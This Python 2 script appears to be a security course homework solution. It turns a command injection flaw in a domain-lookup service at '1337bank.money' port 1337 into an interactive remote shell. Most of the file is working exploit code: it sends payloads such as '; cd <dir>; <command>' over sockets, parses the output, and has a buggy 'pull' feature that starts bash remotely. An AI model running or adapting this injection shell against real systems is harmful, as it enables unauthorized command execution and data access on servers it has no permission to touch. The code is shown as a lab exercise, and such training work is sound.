"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket

host = "1337bank.money" # IP address here
port = 1337 # Port here

directory = "/"

if __name__ == '__main__':
    #shell_prompt = "(type shell to get shell)> "

    while True:

        input = raw_input("> ")

        if (input == "shell"):
            #connect to ensure it works



#shell start
            while True:

                input2 = raw_input("1337bank.money:~" + directory + "$ ")

                if (input2 == "quit"):
                    print("Shell session ended! Enter quit again to quit everything.")
                    break
                elif ("cd" in input2):
                    input2 = input2.split(' ', 1)[1]
                    directory = directory + input2
                    print(directory)

                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((host, port))
                    print(".....injecting ; cd " + input2 + " \n") #print it to delay the time a bit
                    s.send("; cd " + input2 + " \n")

                    data = s.recv(1024) #useless - Give me a domain or IP to look up:
                    data = s.recv(1024) #prints too much, just need end
                    #print(data.split()[-1])
                elif (input2 == "ls"):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((host, port))
                    print(".....injecting ; cd " + directory + "; ls\n")
                    s.send("; cd " + directory + "; ls\n")

                    data = s.recv(1024) #useless - Give me a domain or IP to look up:
                    #print(data)
                    data = s.recv(1024) #prints too much, just need end

                    print(data.split("239",1)[1].strip())
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((host, port))
                    print(".....injecting ; cd " + directory + "; " + input2 + " \n")
                    s.send("; cd " + directory + "; " + input2 + " \n")

                    data = s.recv(1024) #useless - Give me a domain or IP to look up:
                    #print(data)
                    data = s.recv(1024) #prints too much, just need end
                    print(data.split("239",1)[1].strip())

#shell end
        if (input == "pull"):
            param = input.split(" ")

            #print(param[1])
            #print(param[2])

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            #get bash started
            s.send("; bash\n")
            data = s.recv(1024)
            #print(data)

            #copy using cp
            s.send("cp " + param[1] + " " + param[2] + "\n")
            data = s.recv(1024)

            print("File pulled!\n")


        if (input == "help"):

            print("1. shell Drop into an interactive shell and allow users to gracefully exit\n")
            print("2. pull <remote-path> <local-path> Download files\n")
            print("3. help Shows this help menu\n")
            print("4. quit Quit the shell\n")

        if (input == "quit"):
            print("Bye!")
            break
